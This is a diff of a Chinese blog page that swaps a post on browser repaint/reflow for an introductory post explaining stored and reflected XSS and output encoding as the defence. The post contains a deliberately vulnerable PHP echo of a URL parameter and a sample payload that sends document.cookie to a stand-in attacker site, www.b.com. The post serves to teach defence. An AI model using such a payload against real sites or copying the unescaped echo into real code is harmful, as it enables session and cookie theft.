@@ -4,8 +4,7 @@
   <meta charset="utf-8">
   <base target="_blank" />
   
-  <meta name="description" content="重绘（repaint）：当元素的属性（如 color）发生变化时，浏览器会重新绘制相应的元素；
-回流（reflow）：当元素布局（如 width）改变，浏览器抛弃原有属性，重新计算渲染树并重新布局。" />
+  <meta name="description" content="XSS ：跨站脚本攻击（Cross Site Scripting）。为了区别于层叠样式表（Cascading Style Sheet）的缩写 CSS，一般将其缩写为 XSS。XSS 针对一种 web 安全漏洞，该漏洞允许攻击者将恶意脚本注入到用户接收的网页中，以完成某种不利于用户的操作。" />
   
 
   
@@ -14,21 +13,18 @@
   
   
   
-  <title>重绘和回流（repaint &amp; reflow） | 南潮的博客</title>
+  <title>XSS 攻击原理 | 南潮的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="重绘（repaint）：当元素的属性（如 color）发生变化时，浏览器会重新绘制相应的元素；
-回流（reflow）：当元素布局（如 width）改变，浏览器抛弃原有属性，重新计算渲染树并重新布局。">
+  <meta name="description" content="XSS ：跨站脚本攻击（Cross Site Scripting）。为了区别于层叠样式表（Cascading Style Sheet）的缩写 CSS，一般将其缩写为 XSS。XSS 针对一种 web 安全漏洞，该漏洞允许攻击者将恶意脚本注入到用户接收的网页中，以完成某种不利于用户的操作。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="重绘和回流（repaint & reflow）">
-<meta property="og:url" content="http://nanchao.win/2017/03/30/repaint-and-reflow/index.html">
+<meta property="og:title" content="XSS 攻击原理">
+<meta property="og:url" content="http://nanchao.win/2017/04/05/XSS/index.html">
 <meta property="og:site_name" content="Enjoy javascript">
-<meta property="og:description" content="重绘（repaint）：当元素的属性（如 color）发生变化时，浏览器会重新绘制相应的元素；
-回流（reflow）：当元素布局（如 width）改变，浏览器抛弃原有属性，重新计算渲染树并重新布局。">
-<meta property="og:updated_time" content="2017-04-05T06:00:11.360Z">
+<meta property="og:description" content="XSS ：跨站脚本攻击（Cross Site Scripting）。为了区别于层叠样式表（Cascading Style Sheet）的缩写 CSS，一般将其缩写为 XSS。XSS 针对一种 web 安全漏洞，该漏洞允许攻击者将恶意脚本注入到用户接收的网页中，以完成某种不利于用户的操作。">
+<meta property="og:updated_time" content="2017-04-05T09:24:12.523Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="重绘和回流（repaint & reflow）">
-<meta name="twitter:description" content="重绘（repaint）：当元素的属性（如 color）发生变化时，浏览器会重新绘制相应的元素；
-回流（reflow）：当元素布局（如 width）改变，浏览器抛弃原有属性，重新计算渲染树并重新布局。">
+<meta name="twitter:title" content="XSS 攻击原理">
+<meta name="twitter:description" content="XSS ：跨站脚本攻击（Cross Site Scripting）。为了区别于层叠样式表（Cascading Style Sheet）的缩写 CSS，一般将其缩写为 XSS。XSS 针对一种 web 安全漏洞，该漏洞允许攻击者将恶意脚本注入到用户接收的网页中，以完成某种不利于用户的操作。">
   
   
     <link rel="icon" href="/css/images/favicon.ico">
@@ -102,7 +98,7 @@
 
 </script>
       <div id="main" class="wrapper">
-        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-repaint-and-reflow" class="post-repaint-and-reflow post type-post status-publish format-standard hentry">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-XSS" class="post-XSS post type-post status-publish format-standard hentry">
     <!---->
 
       <header class="entry-header">
@@ -110,16 +106,16 @@
         
   
     <h1 class="entry-title article-title">
-      重绘和回流（repaint &amp; reflow）
+      XSS 攻击原理
     </h1>
   
 
         
         <div class="comments-link">
             
-            <a href="/2017/03/30/repaint-and-reflow/#comments" class="leave-reply">Reply</a>
+            <a href="/2017/04/05/XSS/#comments" class="leave-reply">Reply</a>
             
-            <a href="javascript:void(0);" data-url="http://nanchao.win/2017/03/30/repaint-and-reflow/" data-id="cj14kwnei001m3wbaxdbtyh4e" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://nanchao.win/2017/04/05/XSS/" data-id="cj14kwnbg00063wbaxq4dyytu" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -127,94 +123,50 @@
 
     <div class="entry-content">
       
-        <p>重绘（repaint）：当元素的属性（如 color）发生变化时，浏览器会重新绘制相应的元素；</p>
-<p>回流（reflow）：当元素布局（如 width）改变，浏览器抛弃原有属性，重新计算渲染树并重新布局。</p>
+        <p>XSS ：跨站脚本攻击（Cross Site Scripting）。为了区别于层叠样式表（Cascading Style Sheet）的缩写 CSS，一般将其缩写为 XSS。XSS 针对一种 web 安全漏洞，该漏洞允许攻击者将恶意脚本注入到用户接收的网页中，以完成某种不利于用户的操作。</p>
 <a id="more"></a>
-<p><strong>首先说下页面的渲染过程：</strong></p>
-<blockquote>
-<p>① 解析 html 结构为 dom 树。包括 display : none 元素和用 js 动态添加的元素；<br>② 解析 css，产生 css 规则树；<br>③ 通过 dom 树和 css 规则树构造渲染（render）树；<br>④ 浏览器“画”出所有渲染树中的节点。</p>
-</blockquote>
-<p>其中，渲染树不包括隐藏的节点，比如 display : none 的节点，head 节点等。</p>
-<p><strong>以下情况会触发「重绘」和「回流」：</strong></p>
-<p>（1）页面首次加载；<br>（2）dom 元素的添加，修改，删除；<br>（3）应用新的 css 样式；<br>（4）resize 浏览器窗口、滚动页面；<br>（5）读取元素的某些属性（scrollTop/Left、clientTop/Left、currentStyle等）。</p>
-<p>前 4 条触发重绘或者回流的原因比较好理解。这里解释一下第 5 条：由于每次重绘、回流都会产生计算消耗，所以大多数浏览器都通过维护一个回流/重绘队列并批量执行来优化重排过程，而不是一句代码就回流/重绘一次的。但是，<strong>获取布局信息的（返回最新的布局信息）</strong>操作会导致队列被强制刷新（浏览器马上执行渲染队列并触发重排以返回正确值）</p>
-<p>重绘不一定需要回流。比如改变某个元素的颜色，就只会发生重绘，而不会发生回流，因为页面布局没有变。但是回流必然会导致重绘，比如，改变一个元素的大小，就会同时触发重绘和回流。提高网页性能的手段之一就是减少页面重绘和回流，以下都是实践中的一些小技巧。</p>
-<p><strong>减少「重绘」和「回流」：</strong></p>
-<p>（1）<strong>不要一条条修改样式，尽量通过 className 来修改；</strong></p>
-<pre><code>// 反模式，不推荐
-var left = 10,top = 20;
-el.style.left = left + &quot;px&quot;;
-el.style.top = top + &quot;px&quot;;
+<p>简单地说，攻击者可以利用 XSS 漏洞向用户发送攻击脚本，因为用户的浏览器并不知道这段脚本是恶意的，所以依然会执行它。这段恶意脚本可以像正常脚本一样访问 cookie、读取保存在浏览器里的敏感信息，甚至还可以改写页面，进行钓鱼攻击。</p>
+<p>下面看两个例子，我们会对 XSS 有个直观的认识。</p>
+<p><strong>场景一：</strong></p>
+<p>攻击者在某网站评论页面，提交了一段可执行的 JavaScript 脚本（这里假设为“恶意脚本”），若服务器端接收到这段脚本后，没有进行过滤或者转义这段脚本，而是将其作为普通的内容发布到了用户评论区，那么，后续用户访问到这个页面后，就会执行这段注入的“恶意脚本”。</p>
+<p><strong>场景二：</strong></p>
+<p>网站 www.a.com 会根据 url 后参数 content 来呈现不同的内容，我们假设页面 index.php 代码如下：</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;接收的内容：&lt;/h1&gt;
 
-// 推荐
-el.className += &quot; newClassName&quot;;
+&lt;?php
+    echo $_GET[&#39;content&#39;];
+?&gt;
 
-// 推荐
-el.style.cssText += &quot;;left:&quot;+left+&quot;px;top:&quot;+top+&quot;px;&quot;;
-</code></pre><p>（2）<strong>dom 离线后修改；</strong></p>
-<p>  · clone 一份要修改的 DOM 节点，改完后，覆盖在线的对应节点；</p>
-<p>  · 先把 DOM 给 display:none （有一次 reflow），然后修改。改好了再把它显示出来。</p>
-<pre><code>var oldNode = document.getElementById(&quot;res&quot;),
-    clone = oldNode.cloneNode(true);
-
-// 处理克隆对象...
-
-// 完成后：
-oldNode.parentNode.replaceChild(clone,oldNode);
-</code></pre><p>（3）<strong>如果创建多个 dom 节点，使用 documentFragment 创建完后一次性加入 document；</strong></p>
-<pre><code>// 反模式，创建完节点立即添加进文档
-var p,t;
-
-p = document.createElement(&#39;p&#39;);
-t = document.createTextNode(&#39;first paragraph&#39;);
-p.appendChild(t);
-document.body.appendChild(p);
-
-p = document.createElement(&#39;p&#39;);
-t = document.createTextNode(&#39;second paragraph&#39;);
-p.appendChild(t);
-document.body.appendChild(p);
-
-// 推荐，使用文档碎片，添加一次碎片节点
-var p,t,frag;
-
-frag = document.createDocumentFragment();
-
-p = document.createElement(&#39;p&#39;);
-t = document.createTextNode(&#39;first paragraph&#39;);
-p.appendChild(t);
-frag.appendChild(p);
-
-p = document.createElement(&#39;p&#39;);
-t = document.createTextNode(&#39;second paragraph&#39;);
-p.appendChild(t);
-frag.appendChild(p);
-
-document.body.appendChild(frag);
-</code></pre><p>（4）<strong>不要把 dom 节点的属性放在循环里，以免大量读取这个节点的属性；</strong></p>
-<pre><code>// 反模式
-for (var i = 0;i &lt; 100;i++){
-    document.getElementById(&quot;res&quot;).innerHTML += i;
-}
-
-// 推荐
-var i = 0,content = &quot;&quot;;
-for (;i &lt; 100;i++){
-    content += i;
-}
-document.getElementById(&quot;res&quot;).innerHTML += content;
-</code></pre><p>（5）<strong>尽可能地修改层级比较低的 dom；</strong></p>
-<p>（6）<strong>动画节点的 position 属性设置为 fixed 或 absolute；</strong></p>
-<p>（7）<strong>不要使用 table 布局。因为可能很小的一个小改动会造成整个 table 的重新布局。</strong></p>
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>当我们访问地址 <a href="http://www.a.com/index.php?content=test" target="_blank" rel="external">http://www.a.com/index.php?content=test</a> 时，页面输出内容就是 test。这样好像并没有什么问题，但是，如果攻击者将访问地址修改为 <a href="http://www.a.com/index.php?content=&lt;script&gt;window.open(&quot;www.b.com?param=&quot;+document.cookie)&lt;/script&gt;，" target="_blank" rel="external">http://www.a.com/index.php?content=&lt;script&gt;window.open(&quot;www.b.com?param=&quot;+document.cookie)&lt;/script&gt;，</a> 问题就来了。当某人打开这个地址后，除了打开 www.a.com ,还会弹出一个新的窗口 www.b.com（攻击者的站点），并且带上他保存在本地的 cookie，这些 cookie 很可能包含了他的用户名、密码等私密信息，而这些信息都会被攻击者获取。</p>
+<p>（当然了，安装上面步骤操作一遍，我们不一定能看到上面所说的现象，那是因为有些浏览器会自带一些保护性措施来防止这种 XSS 攻击）</p>
+<p>XSS 攻击大体分为以上两类：</p>
+<p><strong>① 存储式攻击</strong><br>主要出现在让用户输入数据，然后存入数据库的场景，比如留言、评论、博客日志和各类表单等。攻击者在这类页面输入恶意脚本后，若未经过滤直接入库，应用程序从数据库中读取这些“恶意脚本数据”，并在页面中发布出来，后续用户浏览此页面时就可能受到攻击。</p>
+<p><strong>② 反射型攻击</strong><br>攻击者将恶意脚本代码加入 url 地址的请求参数里，应用程序接收到请求参数后，将参数直接输入，就可能引入可执行的代码块。用户点击类似的恶意链接就可能执行此代码块，受到攻击。</p>
+<p><strong>归根结底，以上两类情况都是没有对用户提交的数据（参数）做过滤检查。所以，开发者应该有一个共识：永远不要相信用户的输入！对用户的输入进行过滤和审核是一个必要的环节！</strong></p>
+<p>依据以上分析，我们知道：<strong>预防 XSS 攻击的核心就是在输出不可信数据的时候进行编码，过滤特殊字符。</strong></p>
+<pre><code>&lt;     -&gt;  &amp;lt;    
+&gt;     -&gt;  &amp;gt;
+&amp;     -&gt;  &amp;amp;
+&quot;     -&gt;  &amp;quot; 
+&quot;     -&gt;  &amp;#x27;
+空格  -&gt;  &amp;nbsp;  
+/     -&gt;  &amp;#x2f;
+</code></pre><p>以上编码转换能够防御一部分 XSS 攻击。实际生产过程中，具体问题还是应该具体分析。</p>
+<p>参考：<br>[1] <a href="https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.3.md" target="_blank" rel="external">https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.3.md</a><br>[2] <a href="http://blog.csdn.net/ghsau/article/details/17027893" target="_blank" rel="external">http://blog.csdn.net/ghsau/article/details/17027893</a><br>[3] <a href="http://www.freebuf.com/articles/web/9977.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/9977.html</a></p>
 
       
     </div><!-- .entry-content -->
 
 
     <footer class="entry-meta">
-    <a href="/2017/03/30/repaint-and-reflow/">
-    <time datetime="2017-03-30T07:56:54.000Z" class="entry-date">
-        2017-03-30
+    <a href="/2017/04/05/XSS/">
+    <time datetime="2017-04-05T06:12:50.000Z" class="entry-date">
+        2017-04-05
     </time>
 </a>
     
@@ -238,10 +190,8 @@ document.getElementById(&quot;res&quot;).innerHTML += content;
 <nav class="nav-single">
     <h3 class="assistive-text">文章导航</h3>
     
-        <p><span class="nav-previous"><a href="/2017/03/31/localStorage/" rel="prev"><span class="meta-nav">上一篇：</span>浏览器本地存储（一）</a></span></p>
     
-    
-        <p><span class="nav-next"><a href="/2017/03/28/cache/" rel="next"><span class="meta-nav">下一篇：</span>浏览器缓存 </a></span></p>
+        <p><span class="nav-next"><a href="/2017/04/05/localStorage01/" rel="next"><span class="meta-nav">下一篇：</span>浏览器本地存储（二） </a></span></p>
     
 </nav><!-- .nav-single -->
 
